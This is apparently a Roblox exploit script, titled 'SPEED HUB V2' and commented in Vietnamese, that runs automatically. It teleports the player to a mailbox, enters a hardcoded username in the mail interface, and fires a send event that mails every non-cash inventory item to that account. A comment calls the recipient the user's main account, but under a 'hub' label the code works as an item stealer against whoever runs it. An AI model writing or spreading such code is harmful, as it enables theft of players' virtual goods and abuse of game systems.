-- Hệ thống SPEED HUB V2: Tối ưu hoá tìm ô nhập liệu & Tự động gửi
if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualInputManager = game:GetService("VirtualInputManager")

local targetUsername = "sutkucheonhamku"
local KEYWORD = "jandel" -- Từ khóa nhận diện ô nhập liệu của bạn

-- Hàm click vật lý
local function virtualClick(element)
    if not element or not element:IsA("GuiButton") then return end
    local pos = element.AbsolutePosition + (element.AbsoluteSize / 2)
    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y + 36, 0, true, game, 1)
    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y + 36, 0, false, game, 1)
end

-- =======================================================================
-- BƯỚC 1: TELE VÀ MỞ HÒM THƯ (Logic đã kiểm chứng)
-- =======================================================================
local function instantOpenMailbox()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local targetPrompt = nil
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if obj:IsA("ProximityPrompt") and string.find(string.lower(obj.Parent.Name), "mail") then
            targetPrompt = obj
            break
        end
    end
    
    if targetPrompt then
        local part = targetPrompt.Parent:IsA("BasePart") and targetPrompt.Parent or targetPrompt.Parent:FindFirstChildWhichIsA("BasePart")
        rootPart.CFrame = part.CFrame * CFrame.new(0, 1.5, 2)
        task.wait(0.5)
        targetPrompt:InputHoldBegin()
        task.wait(targetPrompt.HoldDuration + 0.1)
        targetPrompt:InputHoldEnd()
        task.wait(1)
        return true
    end
    return false
end

-- =======================================================================
-- BƯỚC 2: TỰ ĐỘNG ĐIỀN TÊN (KẾT HỢP LOGIC CỦA BẠN) & CLICK CHỌN
-- =======================================================================
local function processMailUI()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    -- 1. Tìm ô nhập liệu bằng từ khóa "jandel"
    local searchBox = nil
    for _, v in ipairs(PlayerGui:GetDescendants()) do
        if v:IsA("TextBox") and (string.find(string.lower(v.Name), KEYWORD) or string.find(string.lower(v.PlaceholderText or ""), KEYWORD)) then
            searchBox = v
            break
        end
    end
    
    if searchBox then
        searchBox.Text = targetUsername
        searchBox:ReleaseFocus(true)
        task.wait(1.5) -- Chờ game lọc danh sách
        
        -- 2. Nhấp vào kết quả đầu tiên (ô nick chính)
        for _, obj in ipairs(PlayerGui:GetDescendants()) do
            if obj:IsA("TextButton") and string.find(string.lower(obj.Text or ""), string.lower(targetUsername)) then
                virtualClick(obj)
                task.wait(0.5)
                break
            end
        end
    end
end

-- =======================================================================
-- BƯỚC 3: GỬI ĐỒ SIÊU TỐC
-- =======================================================================
local function transferItems()
    local MailEvent = nil
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") and (string.find(string.lower(obj.Name), "mail") or string.find(string.lower(obj.Name), "send")) then
            MailEvent = obj
            break
        end
    end
    
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
    
    if MailEvent and Inventory then
        for _, item in pairs(Inventory:GetDescendants()) do
            if item:IsA("ValueBase") and item.Value > 0 and not string.find(string.lower(item.Name), "cash") then
                MailEvent:FireServer(targetUsername, item.Name, math.min(item.Value, 20))
                task.wait(0.1)
            end
        end
        print("[SPEED HUB] ==== HOÀN TẤT TẤT CẢ! ====")
    end
end

-- Kích hoạt
task.spawn(function()
    if instantOpenMailbox() then
        task.wait(1)
        processMailUI()
        task.wait(1)
        transferItems()
    end
end)
